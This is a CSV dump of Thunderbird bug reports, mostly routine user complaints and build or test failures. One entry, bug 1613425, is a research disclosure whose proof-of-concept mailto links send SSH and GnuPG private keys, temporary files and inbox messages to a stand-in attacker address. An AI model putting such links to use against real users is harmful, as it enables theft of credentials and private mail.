1613278,Linux32 perma-fail (Thunderbird) TEST-UNEXPECTED-TIMEOUT | toolkit/components/telemetry/tests/unit/test_TelemetrySend.js | Test timed out,RESOLVED,P5,WONTFIX,**Filed by:** geoff [at] darktrojan.net **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287519311&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/e986EFyUSgCPQ0NYREFuhA/runs/0/artifacts/public/logs/live_backing.log ---
1613284,Attachment pane view state machinery via keyboard shortcut (Alt+M) regressed,RESOLVED,--,FIXED,"From Bug #1613004, comment 0: Some other behaviour of the carefully-crafted shortcut-operated attachment pane state machinery is also broken (repeated Alt+M), e.g. with a focused but not selected attachment, unexpectedly bringing up the dialog whilst simultaneously hiding the bucket. I'll file this as a stub, we can do more details as we go along."
1613298,Emails appearing with incorrect dates,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: I loaded Thunderbird, which downloaded all my emails from my Yahoo account. Actual results: Everything was correct, except one email. A very old email from 05/02/2011 an 08:00 appeared at the TOP of the chronological list, with a date of 04/02/2020 at 18:11. Expected results: The email should have appeared with the correct date! All other devices (My Android phone, Yahoo's web interface, Android's built in mail app) ALL show this email with the correct date and time, and accordingly it appears among other VERY old emails from 2011. Be aware that this is NOT a case of a duolicate email - it is from a Bank with whom I haven't had an account for years, and details a financial transaction in February 2011"
1613392,from: to: subject filters in global search,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Try to find via global search an email written by someone who appears in many CC lists. Actual results: There is no easy way to filter messages who were sent from or to someone in global search. There was an add-on with this functionality: https://addons.thunderbird.net/en-US/thunderbird/addon/gmailui/ But it stopped working. This is out-of-the-box functionality in GMail.
1613425,Proprietary mailto?attach=... parameter allows to leak arbitrary files on disk,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Steps to reproduce: In the scope of academic research we stumbled over a flaw (feature?) in Thunderbird: By using the proprietary (non-RFC6068) ""mailto?attach=..."" parameter, a website (or other sources for mailto links) can make Thunderbird to attach local files to the composed email. This is arguable a dangerous feature because it allows an attacker to exfiltrate arbitrary files on disk (and also email from the victim's IMAP account), if the victim sends an email based on attacker controlled mailto input and misses the attachment being added. *** Proof-of-concept *** Obtain sensitive files: mailto:sid@evil.com?attach=~/.gnupg/secring.gpg mailto:sid@evil.com?attach=~/.ssh/id_rsa Obtain files without knowning their name: mailto:sid@evil.com?attach=/tmp/*.txt Obtain a full directory listing: mailto:sid@evil.com?attach=~/ Obtain other emails in the victim's inbox: mailto:sid@evil.com?attach=imap:///fetch>UID>/INBOX>1 Note that The existence of the attachment can be further obfuscated, by prepending multiple attach parameters with innocent file names or no file name at"
1613584,"""Update"" button for add-ons vanishes after updating a single add-on",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I have some add-ons installed, and some of them can be upgraded to more recent versions. By clicking ""Search for updates"", a list of all add-ons with upgrades is shown, and each item in that list one has a button ""Upgrade now"" Actual results: Clicking one single ""Upgrade now"" button upgrades that single add-on. On all other add-ons in the list, the ""Upgrade now"" button is exchanged with two buttons for deactivation or removal of that add-on Expected results: Each other add-on to be upgraded still lists ""Upgrade now"" as an action instead of deactivate/remove"
1613628,Sending of username did not succeed. Mail server pop.sfr.fr responded: internal server error,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: Since the upgrade to 68.4.1 I keep getting intermittent errors on my pop accounts ""Sending of username did not succeed. Mail server pop.sfr.fr responded: internal server error"" Actual results: Prior to the upgrade I had no problems. I have tested exactley the same settings on another email program and it works fine, Something has changed. My wife has the same issues I am running KDE Neon Linux - fully updated"
1613747,"Some Address Book ""Notes fields"" import mapping to Outlook 2007 wrong",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Export Addresses as CSV. 2. Then import into Outlook 2007. Actual results: The Notes Field entry ""line"" from Thunderbird, import as separate new Contacts in Outlook. Also, some Outlook FULL NAME field contain email address, phone number, etc. from TB Address entry. Expected results: All Addresses/Notes field entries should import as Notes in Outlook as Notes for a given contact. Only the Full name should appear in the Outlook contact. The email address, etc. from TB should be mapped into the appropriate Outlook field. Many Outlook Contact entry mappings are prefect."
1613752,signal-spam system penalizes thunderbird in favour of competitors,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: I think there is a bug into this add-on. I filed a ticket to the https://www.signal-spam.fr/ team but the support doesn't reply. Now, I warn the Thunderbird team that the signal spam extension for Thunderbird penalizes the Thunderbird comparing to other email softwares. Actual results: I can't open links from an email into my web browser (Firefox) when I enable the signal-spam 3.0.5 addon for Thunderbird. If I disable this addon, then Thunderbird is able to open email links into Firefox. Expected results: Signal spam shouldn't prevent opening links outside Thunderbird. This spam fighting system became quite essential for me during the last years."
1613774,fonts not recognized for received messages - message pane is blank,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Try to read message. Actual results: Message text is not displayed - pane is blank. Expected results: With version 68.4.2 I'm seeing a high frequency of messages for which thunderbird can't seem to identify the source font(s). But ...... when opening ""reply to sender"" the complete source text is displayed. Clearly the source fonts can be identified in these cases - so why can't the message be displayed on ""reading"" but can be correctly displayed on ""responding""???"
1613856,Copy of Accounts causes error,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I copied my accounts (folder) from the origin PC, Version 68.4.2. On the Target PC I installed Thunderbird, version 68.4.2. Like described on the mozilla website for transfering accounts from a PC to another PC, I did all the same steps. I tried a lot of times with de-installing, installing, open with accounts and without. Actual results: The first time Thunderbird startet and everything went well. All accounts are availbale and access to the accounts on the origin webpages went successfull. After closing Thunderbird and open again the error occurs, Thunderbird crashes, see attached file. Without copying my accounts the error does not accour, Thunderbird is starting without an crashes. Expected results: Starting every time without crashing"
1613892,Change of spelling dictionarry not possible,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Spell checking new message: There is Ecglish as only language in dropddown (OS language is German as ssshown in preferences. too). Actual results: Adding other languages - Installing - success message of install. But even a restart will not change or show German language in dropdown list. Same with other language (French). Manual download and start of xpi ends the same way. Other way of manujal istallation not found Expected results: possible change of language or even German as general language
1613913,"text attachments do not display inline in the body of the email in the display window even when ""Display attachments inline"" is selected.",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I sent myself a plain text file (.txt) as an attachment. Under the ""View"" tab I selected ""View attachments inline"". Actual results: The message did not display in the message display window Expected results: The message should have displayed in the message display window. This was working until the latest update."
1613965,73.0b1 install removes all toolbar customization,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Installed 73.0b1 Toolbar reverted to default. (no reply, forward, etc.; all toolbar with text + icon) Actual results: Toolbar reverted to default. Expected results: Toolbar retain customization."
1614007,"autoconfig fails, gmail auth prompt not given for username with ""@gmail.com""",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: https://youtu.be/1q1caT4Hfss"
1614020,Downloaded message counter higher than total count,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: Not sure exactly what triggered the issue. The only notable thing I did was trying to search for a mail that contained a specific phrase and and I tried doing so in Sent and then All Mail folders. Messages were being downloaded via ProtonMail Bridge https://protonmail.com/bridge/thunderbird The about window showed version 68.1.x (don't remember the x). Since then it has been updates to 68.4.2. Confusingly there are higher versions listed in the bug version dropdown field. Actual results: Thunderbird was downloading messages. Eventually I noticed that counter on the bottom bar has passed the count of total messages. Expected results: The counter of downloaded messages should not have increased over total count of messages."
1614031,"Intermittent comm/mail/components/preferences/test/browser/browser_cloudfile.js | can't access property ""addSelectionListener"", this.contentWindow.getSelection(...) is null at enableMagicCopy@chrome://chat/content/conversation-browser.js:339:12",RESOLVED,P5,FIXED,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287961220&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/Gf-G5qBTQfef4QplcdT_9w/runs/0/artifacts/public/logs/live_backing.log ---
1614111,Messing with Windows Proxy settings,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: It's enough to have Thunderbird open and just wait an issue to happen. Environment: Thunderbird proxy connection settings are ""Use system proxy settings"". Using ordinary ethernet connection - no VPN is conencted! Windows 10 v1909 Actual results: Thunderbird.exe changes the proxy settings in the windows registry. After all system proxy settings based applications lose Internet acces (e.g. Chrome, Slack..). Extract from Process Monitor: 07:48:25,4667323 thunderbird.exe 12468 RegQueryKey HKCU SUCCESS Query: HandleTags, HandleTags: 0x0 07:48:25,4667467 thunderbird.exe 12468 RegOpenKey HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings SUCCESS Desired Access: Read 07:48:25,4667610 thunderbird.exe 12468 RegQueryValue HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable SUCCESS Type: REG_DWORD, Length: 4, Data: 0 07:48:25,4667783 thunderbird.exe 12468 RegQueryValue HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer NAME NOT FOUND Length: 144 07:48:25,4667913 thunderbird.exe 12468 R"
1614128,A lot of emails I am sending out seem to be ending up in clients spam folders for no reason.,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: A lot of emails I am sending are going into spam folder to the person I am sending. For no reason. Even if they have sent me email first. Actual results: Tried several times re writing and re sending email and still same result Expected results: Email arrived at inbox and not persons spam folder."
1614131,Mails with timezone in the future will display false date even in received-column,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Steps to reproduce: Recieved a Mail with a timezone way in the future >+9999 Actual results: It displays it's date wrongly in the ""Recieved""-Column (and ""Date""-Column). (see screenshot) The ""Received""-Date in the Header of the Mail has the correct date (Sat, 08 Feb 2020 etc.) but Thunderbird still shows the wrong date in the received-Column. This is different to Bug 1609661 and 194585. Expected results: The received-Column should display the correct time the mail was received."
1614132,Thunderbird 68.4.X reports Lightning and other compatible extensions are not compatible,RESOLVED,--,INVALID,"Thunderbird 68.4.1 and 68.4.2 (64-bit) both report the bundled Lightning is incompatible with Thunderbird even though it's working. It also reports all other extensions are incompatible even though they are also working. I tried uninstalling and reset on extensions.installedDistroAddon.{e2fda1a4-762b-4020-b5ad-a41df1933103}, which fixed the issue for the first restart, but after closing and re-opening it's back to being incompatible. Tried uninstalling Provider for Google Calendar and re-installing from Thunderbird UI and after restart it also reports as incompatible."
1614140,Unable to close open tabs from left to right,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Open multiple mails, so that you have at least two open tabs. Try closing the tabs from left to right, presumably closing the tabs with increasing index number. Actual results: You can only close the first tab. Clicking the X on the second tab does not do anything. Expected results: Every tab should close when clicking on X regardless of it's position/index/sequence they are being closed."
1614145,"Thunderbird no attachment being sent. ""Warning! You are about to send a message of size 94.1 MB. Are you sure you want to do this?",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Thunderbird rev. 68.4.2 (32bit). Send an email. Actual results: Email sent. No file was attached. Warning! You are about to send a message of size 94.1 MB. Are you sure you want to do this? is displayed in a box. I clicked OK. Then ""The size of the message you are trying to send exceeds the global size limit of the server. The message was not sent; reduce the message size and try again. The server responded: 552 5.3.4 Message size exceeds fixed maximum message size.""is displayed in a box. The email is sent. Expected results: Email sent without those messages."
1614150,Numbered bullets have incorrect ordering when nested,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. open compose message window 2. start ordered numbered list with the toolbar button 3. typed out nested ordered number list in message Actual results: Got the following: ``` 1. this 1. is 2. not 3. two?? ``` Expected results: Instead of: ``` 1. this 1. should 2. be 2. two ```
1614159,"column sorts collapse thread in ""open message in conversation""",NEW,--,,"1. use open message in conversation, for thread with >1 message - notice the thread is expanded (and is expanded, regardless of the state when you did ""open"") 2. click to sort any heading result: the thread collapses 3. expand the thread 4. click to sort any heading result: the thread collapses I see this with v68 and beta. Did not attempt to determine if it is a v68 regression. But I'm guessing it is."
1614194,"Preferences tab, when left open, gear wheel favicon after restart not shown",RESOLVED,--,FIXED,STR: - open the preferences and leave open - restart TB Result: The preferences tab shows only a doc icon and no more the gear wheel icon. I tried a build from https://treeherder.mozilla.org/#/jobs?repo=comm-central&revision=a0dda319d59ba06c195aed2a30ef46eee5d8045e and the icon is still correct. With a build from https://treeherder.mozilla.org/#/jobs?repo=comm-central&revision=eb963eb6aec6e17056942021338e08cfb756ffe2 the icon is wrong after a restart. There could be also bug 1613045 in the same check-in but I think this changes are unlikely the culprit.
1614203,Date column sorting symbol bug is not correct initially.,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.131 Safari/537.36 Steps to reproduce: 1. Add a new account 2. Observe default date sorting symbol (^/v) inside folders Actual results: The sorting symbol (arrows ^ or v) is not correct initially. By default, arrow ^ is dispayed but emails are sorted date ascending so it doesn't correspond to the symbol. If you mouse-over the sorting symbol, arrow is automatically reversed and becomes v by itself so it's good now (emails sorting is not modified and are still date ascending). All's well that ends well but if you do nothing you don't have the correct sorting symbol. You need to mouse-over it to make it match the actual sorting. Expected results: Arrow should be v by default, not ^ which doesn't correspond to the initial date ascending sorting."
1614215,preload pinning Key pinning for imap.gmail.com and smtp.gmail.com (HPKP),UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tried to figure out if Thunderbird enforces certificate pinning smtp.gmail.com and imap.gmail.com. Actual results: Not able to find information Expected results: Both smtp.gmail.com and imap.gmail.com should be pinned to the correct (Google) certificate authority, and this should be documented."
1614235,View source: fix line wrapping option,RESOLVED,--,FIXED,"The view source window respects `view_source.wrap_long_lines`, but the UI for it has been broken and hidden for some time."
1614240,Artifact builds broken: language pack not building,RESOLVED,--,FIXED,"Since the big calendar changes, artifact builds on the Try server have started failing at the `mach package` step. I've figured out this is because of the language pack creation, which we don't need to do. This part has apparently never worked as intended, and *something* in calendar was causing it to succeed enough not to break the build."
1614315,Accept invitation: Reply sent from default account instead of recipient/attendee account,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: 1. Get an emailed Google Calendar invite meant for an email address that is not the top email address listed in the side bar. 2. Click on the Accept button above the email Actual results: Accepted the invite on behalf of the very top email address. Expected results: Accept the invite on behalf of the email address to which the invite was sent.
1614422,Server Name and User Name text boxes hidding strings over 20 characters in Server Settings pane of Account Settings window,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I was changing a server name Actual results: I can change the server name but I can not see the complete server name if it is longer than 20 characters. Expected results: Server Name display should go beyond 20 characters and scroll to left when it reaches text box end.
1614469,Account settings tab is not necessarily going to the right account if the it is already open,RESOLVED,--,FIXED,
1614498,TB crash [@ shellextensionu.dll | IShellExtInit_Initialize ] on attachment save and right click to create new folder,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Right click to save email attachment, select folder, right click (with intention to create new folder) - crash. Repeated many times with same steps. Actual results: Crash. Expected results: No crash."
1614594,mail header and mail preview sometimes does not match,UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: This problem can not be reproduced. It occurs sometimes, say one time at 2 weeks. Environment: WIN 10 Version 1909 (Build 18363.628) Thunderbird 68.4.2 (64 Bit) Actual results: Text in ""subject"" does not match text in preview. See attached file."
1614647,Thunderbird crashes [@ DPA_DeletePtr ] when attempting to add a photo as an attachment,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I'm running Thunderbird 68.4.2 (32-bit) version. When I try to attach a picture from a file in a folder on my PC Thunderbird crashes. Does it every time. I can copy the picture and embed it in the body of the email, but I can not use the ""Attach"" button at the top left of the new message I am writing. As soon as I hit ""attach"", it brings up the window to choose a picture, but if I left click on a folder in that pane, Thunderbird immediately crashes. I have attached a copy of the screen before I try to select a folder. Anything I click on in that pane causes the crash. Actual results: Thunderbird crashes. I have attached a screen shot of the Thunderbird crash notice that comes up on my screen after it crashes. Let me know if you need something else. Expected results: Thunderbird should let me select any folder I want, and any picture and attach it."
1614675,browser.runtime.onSuspend is undefined,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: tried to set a onSuspend listener : browser.runtime.onSuspend.addListener(clearReminders); Actual results: Error message : TypeError: browser.runtime.onSuspend is undefined Expected results: listener registered as defined in : https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onSuspend that is referenced from : https://thunderbird-webextensions.readthedocs.io/en/68/index.html
1614684,Authentication to server imap.aol.com failed after starting Thuderbird,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: My Thunderbird version: 68.4.2 (64-Bit) Retrieve emails, send emails. Actual results: After a couple of seconds after starting Thunderbird message "" Anmeldung auf dem Server imap.aol.com mit Benutzernamen ""mjgeisler@aol.com"" fehlgeschlagen"" appears. (Means: Log on on server imap.aol.com failed). Expected results: Thunderbird should immediately retrieve my emails."
1614699,poor contrast/text not visible in rightmost action button of compact and attachment reminder dialog,RESOLVED,--,WORKSFORME,I'm seeing this with 73.0b2 for compact and attachment reminder dialogs
1614718,error: member access into incomplete type 'nsIInputStream' Needs port of Bug 1614208,RESOLVED,--,FIXED,"My error output: 2:14.90 z:/Mozilla/comm-central/netwerk/sctp/datachannel/DataChannel.cpp(2853,8): error: member access into incomplete type 'nsIInputStream' 2:14.92 aBlob->Close(); 2:14.92 ^ 2:14.93 z:/Mozilla/TB/dist/include/nsIStreamListener.h(19,7): note: forward declaration of 'nsIInputStream' 2:14.93 class nsIInputStream; /* forward declaration */ 2:14.93 ^ 2:15.74 In file included from z:/Mozilla/comm-central/netwerk/sctp/datachannel/DataChannel.cpp:33: 2:15.78 In file included from z:/Mozilla/TB/dist/include/nsServiceManagerUtils.h:10: 2:15.82 In file included from z:/Mozilla/TB/dist/include\nsCOMPtr.h:28: 2:15.84 z:/Mozilla/TB/dist/include\mozilla/RefPtr.h(49,37): error: member access into incomplete type 'nsIInputStream' 2:15.87 static void AddRef(U* aPtr) { aPtr->AddRef(); } 2:15.88 ^ 2:15.88 z:/Mozilla/TB/dist/include\mozilla/RefPtr.h(378,61): note: in instantiation of member function 'mozilla::RefPtrTraits<nsIInputStream>::AddRef' requested here 2:15.88 static void AddRef(U* aPtr) { mozilla::RefPtrTraits<U>::AddRef(aPtr); } 2:15.88 ^ 2:15.88 z:/Mozilla/TB/dist/include\mozilla/RefPtr.h(109,37): note: in instantiation of member function 'RefPtr<nsIInputStream>::ConstRemo"
1614721,Multiple Save Attachment Dialog Boxes Pop up at once -- new behavior,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Opening an e-mail with multiple attachments (usually pictures); View the attached documents at the bottom of the e-mail; select all of them and right click then choose save as. Actual results: A ""Save Attachment"" dialog box pops up for each attachment with it set to the previous folder I had saved things to. When I select a new folder and save the (usually picture) to the new folder; the next dialog box (having already opened) is still at the previous folder instead of the new folder; making me have to find and re-select the new folder for every subsequent attachment. This is a ""new behavior"" -- I have no idea if it is a bug or a purposely designed behavior... but it sure is annoying. As it is annoying and as it wasn't the way it used to be, I am calling this a ""defect report"" below; even though perhaps it was purposely designed that way. Expected results: In previous versions (not sure when the change happened; within the last several weeks around the same time my e-mail notice icon changed from white to black, or the week after that when Thunderbird updated again so soon"
1614796,QP encoded HTML message is not found in search/quickfilter if searchterm is split by softbreak (equal sign at the end of the line),RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763 Steps to reproduce: Excuse my bad english. I have emails that are splitted with equal signs. Here an extracted from the email source: K=C3=A4ufer:&nbsp; =09=09=09=09<a href=3D""https://rover.ebay.com/rover/0/e12011.m43.l7213/7?eu= id=3D227a2a8e50984863a85e126dcb3d8fe2&bu=3D43312651648&segname=3D12011&crd= =3D20200210105018&osub=3D-1~1&ch=3Dosgood&loc=3Dhttps%3A%2F%2Fwww.ebay.de%2= Fulk%2Fusr%2Fnd1608&sojTags=3Dbu=3Dbu,ch=3Dch,segname=3Dsegname,crd=3Dcrd,u= rl=3Dloc,osub=3Dosub"" style=3D""text-decoration: none; color: #0654ba;"">nd16= 08</a>&nbsp; This is a link that shows nd1608 in rendered HTML. The message is splitted/wrapped with the equals sign. The Rendering is correct, but the Quicksearchbar is not finding the message if i search ""nd1608"". if i search ""nd16"", the message is found but ""nd160"" didn't find the message any more. Expected results: Quicksearch should be able to handle the splitted message."
1614830,Advanced Account Settings dialog window too small for content,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open Account Settings, select ""Server Settings"" and click the ""Advanced..."" button. Thunderbird version is 68.5.0. Actual results: Dialog is too small at the bottom, ""OK"" and ""Cancel"" buttons are partially outside the dialog window. The dialog cannot be resized. Expected results: Dialog window should be large enough to contain the entire content."
1614857,release-balrog tasks fail on Thunderbird beta 74 promotion,RESOLVED,P1,FIXED,"release-balrog-submit-toplevel failed on release promotion on Thunderbird beta 74. Rather cryptic error message: ""Malformed Payload"" I believe this is because the changes in bug 1611212 were done incorrectly."
1614867,Sent Folder Disappeared,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Just opened my email account Actual results: My Sent Folder is gone Expected results: I have always had a sent folder"
1614869,Thunderbird always reverts back to Paragraph mode when breaking out of bulleted list,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Uncheck the ""Use Paragraph format instead of Body Text by default"" 2. Start composing an email (in Body Text mode). 3. Created a bulleted or numbered list. 4. Enter a blank line to exit the list. 5. Continue composing the email. Actual results: After exiting list mode, Thunderbird will revert to Paragraph mode instead of Body Text. Expected results: Thunderbird should default to Body Text."
1614892,"""Programming bug"" reported when setting up new email account manually",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: This is on Ubuntu 18.04.3 LTS, Thunderbird 68.2.2 (64-bit). Cannot manually update versions, etc., as this is rolled out automatically by my company. 1. Start `thunderbird` from gnome-terminal 2. Open Preferences > Account settings 3. Open Account Actions > Add email account 4. Enter name, email address, password 5. click Continue 6. Account found (Exchange account, but am not allowed to install the Owl add-on): Click Manual config 7. Enter config details: - IMAP, Port 993, (SSL/TLS alreaedy in field) - SMTP, 587, (STARTTLS already in field) - Incoming = email address, Outgoing = emtpy 8. Click Re-test 9. Thunderbird finds settings (Kerberos/GSSAPI) 10. Click Done Actual results: I get a pop-up with ""Programming bug. Assertion failed, see log."" Stack trace: 1581498080170 addons.xpi WARN Not converting unknown addon type undefined 1581498088288 addons.xpi WARN Can't get modified time of /usr/lib/thunderbird/features/wetransfer@extensions.thunderbird.net Programming bug. Assertion failed, see log. -- Exception object -- + _message (string) 'Programming bug. Assertion failed, s"
1614939,Tab focus ring no longer cycles through the default buttons of a dialog,RESOLVED,P1,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: Using trunk, update 1. Create a new message (ctrl-n) 2. Edit it, then close: ctrl-w) 3. In the Save as draft dialog, press the tab key Actual results: The caret no longer moves and the user needs to press shift-tab to cycle the dialog Expected results: tab key should cycle the dialog, reverse of shift-tab"
1614952,MacOS unread messages not highlighted,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Using MacOS, open any folder containing unread messages Actual results: All messages in the list show only a regular type face, and unread messages are not distinguished in any way. Expected results: Unread messages should be highlighted in bold. (Note that this is a MacOS problem only. On Windows 10 the message highlighting is correct.)"
1615064,"Subject column (and others) in message list may show any message header starting with a substring of known RFC header, like Su: instead of Subject:",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: I can reproduce this on Windows 10 and Debian 10. Simple variant, simulating reality: - Open a mbox-like file in Thunderbird profile folder with a text editor - Before the real ""Subject: "" line Insert another line beginning with ""S: "" and following any string. Real variant: Use ClawsMail to export mails to mbox format. ClawsMail stores (sometimes, not always) its meta data into the mbox files and create e.g. ""S: "" lines before the ""Subject: "" Here is an example of an Thunderbirds mbox-like-file entry From - Wed Feb 12 21:59:52 2020 S: Fake Subject X-Mozilla-Status: 0001 X-Mozilla-Status2: 00000000 X-Mozilla-Keys: FCC: mailbox://ich%40gmail.com@pop.gmail.com/Sent X-Identity-Key: id1 X-Account-Key: account1 To: receiver@world.uni From: vorname nachname <ich@gmail.com> Subject: This is the real subject Message-ID: <3adb0f5d-9992-9211-073c-fa163304fd4d@gmail.com> Date: Wed, 12 Feb 2020 21:59:52 +0100 X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0; attachmentreminder=0; deliveryformat=4 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Thund"
1615089,TB creating trash folder for Gsuite,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: Nothing Actual results: So I'm not sure when I noticed this after signing up for Gsuite, but it took a couple of weeks to show it to my website coder so he could determine if this was a trash folder in gmail or only in TB & it's ONLY in TB. See how it's below the text ""Gmail?"" That would logically mean that gmail created it, but they didn't. Not only that, it looks to be a folder that is taking multiple drafts of e-mails I'm writing & saving them in this folder & gmail doesn't have a drafts folder, or if there is one, it deletes the e-mail once you send it. This one has the same e-mail saved multiple times & I normally don't take long to write an e-mail which is why I rarely have e-mail in my draft folder (only 6 in my TB draft folder) & why is it named Trash? LOL This is very very strange - https://mega.nz/#!Ip0zTbqA!O-6rvQ2Y7aExTJg_aEJAkDBwbP-P4Kl6mGidkdSoXNI There's no way to empty it, but there is an option to delete, but I thought you should see this is what's happening & if I delete it, will it come back? Thanks Expected results: No"
